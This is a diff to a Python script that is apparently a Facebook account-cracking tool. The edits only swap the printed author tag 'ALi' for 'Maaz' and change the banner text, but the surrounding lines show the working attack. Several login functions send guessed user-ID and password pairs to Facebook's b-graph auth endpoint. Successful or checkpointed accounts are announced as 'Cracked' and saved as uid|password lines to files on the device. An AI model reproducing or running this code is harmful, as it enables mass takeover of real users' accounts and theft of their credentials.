@@ -646,10 +646,10 @@ logo = f"""
     ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝
 \033[0;92m               \033[0;92m
 
-\33[0;41m      [ WORKING WIFI AND MOBILE DATA ]       \033[0;92m
+\33[0;41m      [ Use VPN For More Internet Speed ]       \033[0;92m
 
 \33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-\33[38;5;160m[\033[1;97m✔️\33[38;5;160m] \033[1;97mFACEBOOK   \33[38;5;160m▶  \033[1;97m Mohmmad  MAAZ 🔥
+\33[38;5;160m[\033[1;97m✔️\33[38;5;160m] \033[1;97mFACEBOOK   \33[38;5;160m▶  \033[1;97mMohmmad MAAZ 🔥
 \33[38;5;160m[\033[1;97m✔️\33[38;5;160m] \033[1;97mWHATAPP    \33[38;5;160m▶  \033[1;97m03079741690
 \33[38;5;160m[\033[1;97m✔️\33[38;5;160m] \033[1;97mFEATURE    \33[38;5;160m▶  \033[1;97mOLD CLONE 
 \33[38;5;160m[\033[1;97m✔️\33[38;5;160m] \033[1;97mVERSION    \33[38;5;160m▶  \033[1;97m2.1
@@ -761,7 +761,7 @@ def login1(uid):
     global oks,loop,cps
     Session=requests.session()
     try:
-        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mALi\33[38;5;37m-\x1b[38;5;46mB1\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
+        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\33[38;5;37m-\x1b[38;5;46mB1\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
@@ -809,7 +809,7 @@ def login1(uid):
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mALi\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/maaz-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
@@ -820,7 +820,7 @@ def login2(uid):
     global oks,loop,cps
     Session=requests.session()
     try:
-        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mALi\33[38;5;37m-\x1b[38;5;46mB2\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
+        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\33[38;5;37m-\x1b[38;5;46mB2\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
@@ -865,12 +865,12 @@ def login2(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mALim\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/maaz-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mALi\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/maaz-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
@@ -926,12 +926,12 @@ def login3(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mALi\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/maaz-M2-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mAli\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/maaz-M2-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
@@ -987,12 +987,12 @@ def login4(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mALi\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/maaz-M3-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mALi\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/maaz-M3-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
